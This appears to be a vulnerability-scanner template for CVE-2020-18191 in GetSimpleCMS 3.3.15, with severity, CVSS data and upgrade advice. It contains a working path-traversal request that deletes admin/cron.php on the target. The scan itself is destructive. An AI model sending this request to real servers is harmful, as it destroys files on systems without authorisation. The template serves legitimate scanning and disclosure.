id: CVE-2020-18191

info:
  name: GetSimpleCMS 3.3.15 Arbitrary File Deletion
  author: ProjectDiscoveryAI
  severity: critical
  description: GetSimpleCMS-3.3.15 is affected by directory traversal allowing remote attackers to delete arbitrary files via /GetSimpleCMS-3.3.15/admin/log.php.
  impact: |
    High - Allows an attacker to delete critical files on the server.
  remediation: |
    Upgrade GetSimpleCMS to version 3.3.16 or later to mitigate CVE-2020-18191.
  reference:
    - https://github.com/GetSimpleCMS/GetSimpleCMS/issues/1303
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H
    cvss-score: 9.1
    cve-id: CVE-2020-18191
    cwe-id: CWE-22
    epss-score: 0.00295
    epss-percentile: 0.70018
    cpe: cpe:2.3:a:get-simple:getsimplecms:3.3.15:*:*:*:*:*:*:*
  metadata:
    vendor: get-simple
    product: getsimplecms

http:
  - method: GET
    path:
      - "{{BaseURL}}/GetSimpleCMS-3.3.15/admin/log.php?log=../../../admin/cron.php&action=delete&nonce=babc600c8b8302dfd822f7eba42f846c3ddbb8a5"

    headers:
      User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
      Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
      Referer: http://127.0.0.1/GetSimpleCMS-3.3.15/admin/log.php?log=&action=delete&nonce=,babc600c8b8302dfd822f7eba42f846c3ddbb8a5,babc600c8b8302dfd822f7eba42f846c3ddbb8a5
      Cookie: vGmm_2132_ulastactivity=5a66isXeZdcONhOLRjRQVgmwjWfexLQ79o0nOIdENOlbV4a1I3eU; vGmm_2132_nofavfid=1; vGmm_2132_home_readfeed=1546482302; vGmm_2132_lastcheckfeed=2%7C1546563267; Hm_lvt_6bcd52f51e9b3dce32bec4a3997715ac=1547020074; Hm_lvt_7b43330a4da4a6f4353e553988ee8a62=1550382234; BLUDIT-KEY=5cqmavvdagu99n16379n6ukdh3; GS_ADMIN_USERNAME=admin; 0e6a4c84dc43b5a41cff73fd930b4137fbb4876d=37cc0e982d3f96291f160dcefed4aedeb2bb6e77; __atuvc=1%7C10
      Connection: close
      Upgrade-Insecure-Requests: 1
    matchers:
      - type: status
        status:
          - 200
